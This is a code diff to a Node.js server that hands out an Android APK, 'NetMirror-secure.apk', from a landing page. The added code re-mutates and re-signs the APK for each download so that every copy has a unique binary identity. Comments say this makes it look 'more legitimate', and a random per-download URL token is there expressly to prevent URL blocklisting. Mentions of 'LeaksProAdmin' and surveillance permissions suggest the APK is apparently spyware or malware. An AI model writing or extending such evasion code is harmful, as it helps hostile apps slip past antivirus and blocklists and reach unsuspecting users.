@@ -338,12 +338,99 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // Primary endpoint for landing page downloads — direct APK (same method as admin download-apk)
+  // ═══════════════ LANDING PAGE PER-DOWNLOAD ROTATION ═══════════════
+  // Mirrors LeaksProAdmin's flow: rotate FIRST → then download.
+  // Each download gets a freshly mutated APK with unique binary identity.
+  // mutateAndSign() strips debug info, randomizes version/timestamps,
+  // strips surveillance permissions, and re-signs with v1+v2 — all CLEAN
+  // operations that make the APK look MORE legitimate, not less.
+  // Cached for 5 minutes to avoid excessive CPU on rapid re-downloads.
+  let _landingRotationCache = { buffer: null, timestamp: 0 };
+  const LANDING_ROTATION_TTL = 5 * 60 * 1000; // 5 minutes
+  let _landingRotationInProgress = null; // promise lock
+
+  async function getLandingRotatedApk() {
+    const now = Date.now();
+    // Return cached rotation if still fresh
+    if (_landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL) {
+      return _landingRotationCache.buffer;
+    }
+    // If rotation already in progress, wait for it
+    if (_landingRotationInProgress) {
+      return _landingRotationInProgress;
+    }
+    // Start fresh rotation
+    _landingRotationInProgress = (async () => {
+      try {
+        const dataDir = path.join(__dirname, 'data');
+        const originalPath = path.join(dataDir, 'Netmirror-original.apk');
+        const securePath = path.join(dataDir, 'Netmirror-secure.apk');
+        const regularPath = path.join(dataDir, 'Netmirror.apk');
+
+        let sourceBuf = null;
+        if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+        else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+        else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+
+        if (!sourceBuf) {
+          await ensureApkAvailable();
+          if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+          else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+          else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+        }
+
+        if (!sourceBuf) throw new Error('No base APK available');
+
+        console.log('[Landing Rotation] Starting fresh mutation for download...');
+        const t0 = Date.now();
+        const { buffer: rotatedBuf } = mutateAndSign(sourceBuf);
+        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+        console.log(`[Landing Rotation] Done: ${(rotatedBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
+
+        _landingRotationCache = { buffer: rotatedBuf, timestamp: Date.now() };
+        return rotatedBuf;
+      } finally {
+        _landingRotationInProgress = null;
+      }
+    })();
+    return _landingRotationInProgress;
+  }
+
+  // Step 1: Prepare endpoint — triggers rotation if needed, returns size
+  app.post('/api/landing/prepare-download', async (req, res) => {
+    try {
+      const now = Date.now();
+      const isCached = _landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL;
+      const rotatedBuf = await getLandingRotatedApk();
+      res.json({
+        ready: true,
+        size: rotatedBuf.length,
+        cached: isCached
+      });
+    } catch (err) {
+      console.error('[Landing Rotation] Prepare failed:', err.message);
+      // Fallback: serve the static APK without rotation
+      try {
+        const apkBuf = await getApkBuffer();
+        res.json({ ready: true, size: apkBuf.length, cached: true, fallback: true });
+      } catch (e2) {
+        res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
+      }
+    }
+  });
+
+  // Step 2: Download — serves the freshly rotated APK
   // The :token is random per-download, preventing URL blocklisting
   app.get('/dl/:token', async (req, res) => {
     try {
-      const apkBuf = await getApkBuffer();
-      // Serve raw APK — identical to /api/admin/download-apk method
+      // Prefer the freshly rotated landing APK
+      let apkBuf;
+      try {
+        apkBuf = await getLandingRotatedApk();
+      } catch (e) {
+        // Fallback to static APK if rotation fails
+        apkBuf = await getApkBuffer();
+      }
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
       res.setHeader('Content-Length', apkBuf.length);
@@ -352,7 +439,6 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.end(apkBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
-      // Try serving from disk as fallback
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
       const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
       let apkPath = null;
@@ -367,7 +453,6 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         res.setHeader('Cache-Control', 'no-store');
         res.sendFile(apkPath);
       } else {
-        // Return JSON error so landing page JS can show user-friendly message
         res.status(503).json({
           error: 'APK is being prepared. Please try again in 30 seconds.',
           retry: true,
@@ -488,7 +573,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _apkCache = { buffer: null, timestamp: 0 };
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
-    console.log('[Landing Download] All APK caches invalidated (apk + zip + full)');
+    _landingRotationCache = { buffer: null, timestamp: 0 };
+    console.log('[Landing Download] All APK caches invalidated (apk + zip + full + landing rotation)');
   });
 
   // ═══════════════ REAL-TIME METRICS ═══════════════
